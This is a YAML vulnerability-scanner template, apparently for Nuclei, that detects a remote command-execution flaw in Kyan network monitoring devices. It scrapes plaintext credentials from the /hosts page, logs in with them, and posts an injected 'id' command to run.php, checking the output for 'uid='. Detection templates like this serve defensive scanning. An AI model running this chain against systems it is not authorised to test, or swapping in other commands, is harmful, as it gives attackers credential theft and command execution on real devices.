id: kyan-network-monitoring-run-command-rce
info:
  name: Kyan Network Monitoring Command Execution RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template checks for remote command execution vulnerability in Kyan Network Monitoring devices via the run.php endpoint.
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Kyan%20%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87%20run.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

variables:
  r1: "{{rand_text_alpha(8)}}"
  r2: "{{rand_text_alpha(26)}}"

http:
  - id: user-info-retrieval
    method: GET
    path:
      - "{{BaseURL}}/hosts"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "UserName=(?P<username>.+)\\sPassword=(?P<password>.+)"
    extractors:
      - type: regex
        name: username
        internal: true
        regex:
          - "UserName=(?P<username>.+)\\sPassword="
        group: 1
      - type: regex
        name: password
        internal: true
        regex:
          - "Password=(?P<password>.+)"
        group: 1

  - id: login-authentication
    method: POST
    path:
      - "{{BaseURL}}/login.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: PHPSESSID={{r2}}
    body: "user={{username}}&passwd={{password}}&x=56&y=21"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "设备管理系统"

  - id: execute-command
    method: POST
    path:
      - "{{BaseURL}}/run.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: PHPSESSID={{r2}}
    body: "command=%09++++++id%0D%0A&textarea=++++++++++"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "uid=\\d+\\(.*\\)"
